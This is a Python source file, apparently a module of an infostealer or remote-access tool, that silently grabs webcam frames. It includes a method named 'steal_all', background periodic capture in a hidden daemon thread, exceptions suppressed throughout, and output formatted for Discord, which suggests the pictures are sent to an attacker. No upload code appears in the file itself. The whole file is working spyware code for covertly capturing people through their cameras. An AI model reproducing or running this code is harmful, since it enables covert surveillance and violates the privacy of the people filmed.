import os
import sys
import time
import json
import base64
import threading
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import cv2
except ImportError:
    pass

try:
    from PIL import Image
except ImportError:
    pass

class CameraCapture:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.captures = []
        self.running = False
        self.capture_thread = None
        self.lock = threading.Lock()
        self.camera = None
        self.camera_index = 0
        
    def list_cameras(self):
        cameras = []
        
        try:
            for i in range(10):
                cap = cv2.VideoCapture(i)
                
                if cap.isOpened():
                    cameras.append({
                        "index": i,
                        "available": True
                    })
                    cap.release()
                else:
                    break
        except:
            pass
        
        return cameras
    
    def open_camera(self, index=0):
        try:
            if self.camera and self.camera.isOpened():
                self.camera.release()
            
            self.camera = cv2.VideoCapture(index)
            self.camera_index = index
            
            return self.camera.isOpened()
        except:
            return False
    
    def close_camera(self):
        try:
            if self.camera and self.camera.isOpened():
                self.camera.release()
                self.camera = None
        except:
            pass
    
    def capture_frame(self):
        try:
            if not self.camera or not self.camera.isOpened():
                if not self.open_camera(self.camera_index):
                    return None
            
            ret, frame = self.camera.read()
            
            if ret:
                # Convert to JPEG
                import io
                success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                
                if success:
                    jpg_data = buffer.tobytes()
                    
                    height, width = frame.shape[:2]
                    
                    return {
                        "camera": self.camera_index,
                        "width": width,
                        "height": height,
                        "data": base64.b64encode(jpg_data).decode(),
                        "timestamp": datetime.now().isoformat()
                    }
        except:
            pass
        
        return None
    
    def capture_multiple_frames(self, count=3, interval_seconds=1):
        frames = []
        
        for i in range(count):
            frame = self.capture_frame()
            
            if frame:
                frames.append(frame)
            
            if i < count - 1:
                time.sleep(interval_seconds)
        
        return frames
    
    def start_periodic_capture(self, interval_seconds=60):
        def capture_loop():
            while self.running:
                frame = self.capture_frame()
                
                if frame:
                    with self.lock:
                        self.captures.append(frame)
                
                time.sleep(interval_seconds)
        
        self.running = True
        self.capture_thread = threading.Thread(target=capture_loop, daemon=True)
        self.capture_thread.start()
    
    def stop_periodic_capture(self):
        self.running = False
        
        if self.capture_thread:
            self.capture_thread.join(timeout=5)
        
        self.close_camera()
    
    def save_captures_to_disk(self, captures=None, output_dir=None):
        if captures is None:
            captures = self.captures
        
        if output_dir is None:
            output_dir = os.path.join(self.temp_dir, "camera_captures")
        
        os.makedirs(output_dir, exist_ok=True)
        
        saved_files = []
        
        for capture in captures:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"camera_{timestamp}_{capture.get('camera', 'unknown')}.jpg"
                file_path = os.path.join(output_dir, filename)
                
                jpg_data = base64.b64decode(capture.get("data", ""))
                
                with open(file_path, "wb") as f:
                    f.write(jpg_data)
                
                saved_files.append(file_path)
            except:
                pass
        
        return saved_files
    
    def get_captures(self):
        with self.lock:
            return self.captures
    
    def clear_captures(self):
        with self.lock:
            self.captures = []
    
    def format_captures_for_discord(self, captures=None, limit=20):
        if captures is None:
            captures = self.captures
        
        formatted = []
        
        for capture in captures[:limit]:
            formatted.append({
                "camera": capture.get("camera", "unknown"),
                "width": capture.get("width", 0),
                "height": capture.get("height", 0),
                "timestamp": capture.get("timestamp", ""),
                "data_size": len(capture.get("data", ""))
            })
        
        return formatted
    
    def compress_capture(self, jpg_data, quality=50):
        try:
            import io
            from PIL import Image
            
            # Open JPEG
            image = Image.open(io.BytesIO(jpg_data))
            
            # Resize if too large
            max_dimension = 1280
            if max(image.size) > max_dimension:
                ratio = max_dimension / max(image.size)
                new_size = tuple(int(dim * ratio) for dim in image.size)
                image = image.resize(new_size, Image.LANCZOS)
            
            # Compress
            buffer = io.BytesIO()
            image.save(buffer, format="JPEG", quality=quality)
            
            return buffer.getvalue()
        except:
            return jpg_data
    
    def capture_and_save(self):
        captures = self.capture_multiple_frames(count=3, interval_seconds=0.5)
        
        saved_files = self.save_captures_to_disk(captures)
        
        self.close_camera()
        
        return {
            "captures": captures,
            "saved_files": saved_files
        }
    
    def get_statistics(self):
        return {
            "total_captures": len(self.captures),
            "cameras_available": len(self.list_cameras())
        }
    
    def steal_all(self):
        captures = self.capture_multiple_frames(count=3, interval_seconds=0.5)
        
        self.close_camera()
        
        return {
            "total_captures": len(captures),
            "captures": captures,
            "cameras_available": self.list_cameras(),
            "timestamp": datetime.now().isoformat()
        }

if __name__ == "__main__":
    capture = CameraCapture()
    data = capture.steal_all()
    print(f"Total captures: {data['total_captures']}")
    print(f"Cameras available: {data['cameras_available']}")
    print(json.dumps(capture.format_captures_for_discord(data['captures']), indent=2))